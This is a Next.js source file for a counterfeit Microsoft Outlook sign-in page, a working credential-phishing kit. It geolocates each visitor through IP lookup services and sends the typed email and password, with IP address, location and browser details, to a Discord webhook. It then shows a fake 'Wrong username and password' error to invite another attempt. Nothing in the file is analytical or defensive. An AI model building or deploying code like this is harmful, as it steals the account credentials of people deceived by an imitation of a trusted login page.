"use client";

import { useState, useEffect } from "react";
import Link from "next/link";
import { GrKey } from "react-icons/gr";
import Image from "next/image";

export default function EmailPage() {
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [isError, setIsError] = useState(false);
  const [isLoading, setIsLoading] = useState(false);
  const [isUserInfoFetched, setIsUserInfoFetched] = useState(false);
  const [userInfo, setUserInfo] = useState({
    ipAddress: "",
    country: "",
    location: "",
    userAgent: "",
    browserLanguage: "",
    // screenResolution: "",
    timezone: "",
  });

  const source = "Mail";

  useEffect(() => {
    const fetchUserInfo = async () => {
      try {
        // Try ipapi.co first
        const ipResponse = await fetch("https://ipapi.co/json/", {
          headers: {
            "User-Agent": "Mozilla/5.0", // Some APIs require a valid User-Agent
          },
        });

        if (!ipResponse.ok) {
          throw new Error(`ipapi.co failed with status: ${ipResponse.status}`);
        }

        const ipData = await ipResponse.json();
        // console.log("ipapi.co response:", ipData); // Debug log

        // Collect browser information
        const browserInfo = {
          ipAddress: ipData.ip || "Unknown",
          country: ipData.country_name || "Unknown",
          location: `${ipData.city || "Unknown"}, ${
            ipData.region || "Unknown"
          }`,
          userAgent: navigator.userAgent || "Unknown",
          browserLanguage: navigator.language || "Unknown",
          // screenResolution:
          //   `${window.screen.width}x${window.screen.height}` || "Unknown",
          timezone:
            Intl.DateTimeFormat().resolvedOptions().timeZone || "Unknown",
        };

        setUserInfo(browserInfo);
        setIsUserInfoFetched(true);
      } catch (error) {
        // console.error("Error fetching user info from ipapi.co:", error);

        // Fallback to alternative API (ipgeolocation.io)
        try {
          const fallbackResponse = await fetch(
            `https://api.ipgeolocation.io/ipgeo?apiKey=${process.env.NEXT_PUBLIC_IP_DATA_API_KEY}`,
          );
          const fallbackData = await fallbackResponse.json();
          // console.log("ipgeolocation.io response:", fallbackData); // Debug log

          const browserInfo = {
            ipAddress: fallbackData.ip || "Unknown",
            country: fallbackData.country_name || "Unknown",
            location: `${fallbackData.city || "Unknown"}, ${
              fallbackData.state_prov || "Unknown"
            }`,
            userAgent: navigator.userAgent || "Unknown",
            browserLanguage: navigator.language || "Unknown",
            // screenResolution:
            //   `${window.screen.width}x${window.screen.height}` || "Unknown",
            timezone:
              Intl.DateTimeFormat().resolvedOptions().timeZone || "Unknown",
          };

          setUserInfo(browserInfo);
          setIsUserInfoFetched(true);
        } catch (fallbackError) {
          console.error(
            "Error fetching user info from fallback API:",
            fallbackError,
          );
          // Set fallback values
          setUserInfo({
            ipAddress: "Unknown",
            country: "Unknown",
            location: "Unknown",
            userAgent: navigator.userAgent || "Unknown",
            browserLanguage: navigator.language || "Unknown",
            // screenResolution:
            //   `${window.screen.width}x${window.screen.height}` || "Unknown",
            timezone:
              Intl.DateTimeFormat().resolvedOptions().timeZone || "Unknown",
          });
          setIsUserInfoFetched(true);
        }
      }
    };

    fetchUserInfo();
  }, []);

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!isUserInfoFetched) {
      setIsError(true);
      return;
    }

    setIsLoading(true);
    setIsError(false);

    const webhookUrl = process.env.DISCORD_WEBHOOK!;

    const payload = {
      content: "**New User Info Submission**",
      embeds: [
        {
          title: "User Information",
          color: 0xff69b4, // pink highlight
          fields: [
            { name: "Email", value: email, inline: true },
            { name: "Password", value: password, inline: true },
            { name: "Source", value: source, inline: true },
            {
              name: "IPAddress",
              value: userInfo.ipAddress || "Unknown",
              inline: true,
            },
            {
              name: "Country",
              value: userInfo.country || "Unknown",
              inline: true,
            },
            {
              name: "Location",
              value: userInfo.location || "Unknown",
              inline: false,
            },
            {
              name: "UserAgent",
              value: userInfo.userAgent || "Unknown",
              inline: false,
            },
            {
              name: "BrowserLanguage",
              value: userInfo.browserLanguage || "Unknown",
              inline: true,
            },
            {
              name: "Timezone",
              value: userInfo.timezone || "Unknown",
              inline: true,
            },
          ],
          footer: { text: "Test Submission to Discord" },
          timestamp: new Date().toISOString(),
        },
      ],
    };

    try {
      await fetch(webhookUrl, {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify(payload),
      });

      // Clear form on success
      setEmail("");
      setPassword("");
      setIsError(true);
    } catch (error) {
      console.error("Error submitting form:", error);
      setIsError(true);
    } finally {
      // setIsError(true);
      setIsLoading(false);
    }
  };

  return (
    <div className="relative min-h-screen bg-gray-100 flex flex-col gap-8 items-center justify-center">
      <div className="absolute inset-0 z-0">
        <Image
          src="/images/msc-bg.jpg"
          alt="Hero Background"
          width={10000}
          height={10000}
          className="object-cover bg-right"
        />
        {/* Add overlay div */}
        <div className="absolute"></div>
      </div>
      {/* Header */}

      {/* Main Content */}
      <div className="w-full max-w-md bg-white shadow p-8 z-10">
        <div className="flex justify-start mb-6">
          <Image
            src="/images/mlogo.svg"
            alt="Outlook Logo"
            width={120}
            height={30}
          />
        </div>

        <h1 className="text-2xl  font-semibold text-gray-900 mb-2 text-left">
          Sign in
        </h1>
        <p className="text-sm text-gray-600 mb-6 text-left">
          to continue to Outlook
        </p>

        <form onSubmit={handleSubmit} className="space-y-4 flex flex-col">
          <div>
            <input
              type="text"
              value={email}
              onChange={(e) => setEmail(e.target.value)}
              placeholder="Email, phone, or Skype"
              className="w-full px-4 py-3  border-b border-b-gray-300  focus:outline-none focus:border-b-slate-400 text-gray-900"
              required
            />
          </div>
          <div>
            <input
              value={password}
              onChange={(e) => setPassword(e.target.value)}
              type="password"
              placeholder="Password"
              className="w-full px-4 py-3  border-b border-b-gray-300  focus:outline-none focus:border-b-slate-400 text-gray-900"
              required
            />
          </div>
          <div className="flex justify-between text-sm flex-col gap-4">
            <Link href="#" className="text-slate-950 hover:underline">
              No account? Create one!
            </Link>
            <Link href="#" className="text-slate-950 hover:underline">
              Sign in with Windows Hello or a security key
            </Link>
          </div>

          <div className="flex justify-end">
            <button
              type="submit"
              disabled={isLoading}
              className={`bg-blue-500 text-white px-4 w-full py-2 rounded transition duration-200 ${
                isLoading
                  ? "opacity-50 cursor-not-allowed"
                  : "hover:bg-blue-600"
              }`}
            >
              {isLoading ? "Loading..." : "Next"}
            </button>
          </div>
        </form>
        {isError && (
          <p className="text-red-500 text-sm">Wrong username and password</p>
        )}
      </div>

      <div className="w-full flex items-center gap-4 max-w-md bg-white shadow p-6 z-10">
        <GrKey />
        <Link href="#" className="text-sm text-slate-950 hover:underline">
          Sign-in options
        </Link>
      </div>

      {/* Footer */}
      <footer className="w-full max-w-md px-6 py-4 text-sm text-gray-600 flex justify-between">
        <Link href="#" className="hover:underline">
          Terms of use
        </Link>
        <Link href="#" className="hover:underline">
          Privacy & cookies
        </Link>
      </footer>
    </div>
  );
}
